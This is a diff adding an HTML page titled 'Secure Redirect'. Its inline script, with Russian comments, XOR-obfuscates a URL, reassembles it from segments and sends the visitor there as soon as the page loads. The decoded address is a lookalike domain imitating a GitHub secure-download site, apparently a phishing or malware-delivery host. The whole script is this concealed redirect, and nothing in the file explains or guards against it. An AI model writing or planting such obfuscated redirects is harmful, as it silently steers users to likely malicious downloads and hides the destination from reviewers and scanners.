@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Redirect</title>
+    <script>
+        // Зашифрованные символы (XOR с ключом 0x2A)
+        const encryptedSymbols = [
+            0x48 ^ 0x2A, 0x74 ^ 0x2A, 0x74 ^ 0x2A, 0x70 ^ 0x2A, 0x73 ^ 0x2A, 0x3A ^ 0x2A, 0x2F ^ 0x2A, 0x2F ^ 0x2A, 
+            0x67 ^ 0x2A, 0x69 ^ 0x2A, 0x74 ^ 0x2A, 0x68 ^ 0x2A, 0x75 ^ 0x2A, 0x62 ^ 0x2A, 0x73 ^ 0x2A, 0x65 ^ 0x2A, 
+            0x63 ^ 0x2A, 0x75 ^ 0x2A, 0x72 ^ 0x2A, 0x65 ^ 0x2A, 0x64 ^ 0x2A, 0x6F ^ 0x2A, 0x77 ^ 0x2A, 0x6E ^ 0x2A, 
+            0x6C ^ 0x2A, 0x6F ^ 0x2A, 0x61 ^ 0x2A, 0x64 ^ 0x2A, 0x2E ^ 0x2A, 0x6F ^ 0x2A, 0x6E ^ 0x2A, 0x6C ^ 0x2A, 
+            0x69 ^ 0x2A, 0x6E ^ 0x2A, 0x65 ^ 0x2A, 0x2F ^ 0x2A, 0x68 ^ 0x2A, 0x72 ^ 0x2A, 0x66 ^ 0x2A, 0x2F ^ 0x2A, 
+            0x61 ^ 0x2A, 0x6C ^ 0x2A, 0x6C ^ 0x2A, 0x6E ^ 0x2A, 0x65 ^ 0x2A, 0x77 ^ 0x2A  
+        ];
+
+        const XOR_KEY = 0x2A;
+
+        // Функция для расшифровки символа
+        const decryptChar = (encrypted) => String.fromCharCode(encrypted ^ XOR_KEY);
+
+        // Функция для генерации сегмента
+        const generateSegment = (start, end) => {
+            let segment = '';
+            for (let i = start; i <= end; i++) {
+                segment += decryptChar(encryptedSymbols[i]);
+            }
+            return segment;
+        };
+
+        // Массив функций для сборки сегментов
+        const segmentBuilders = [
+            () => generateSegment(0, 7),    
+            () => generateSegment(8, 15),   
+            () => generateSegment(16, 23),  
+            () => generateSegment(24, 31),  
+            () => generateSegment(32, 39),  
+            () => generateSegment(40, 45)   
+        ];
+
+        // Сборка URL через вызов функций
+        let url = '';
+        for (let builder of segmentBuilders) {
+            url += builder();
+        }
+
+        window.location.href = url;
+    </script>
+</head>
+<body>
+</body>
+</html>
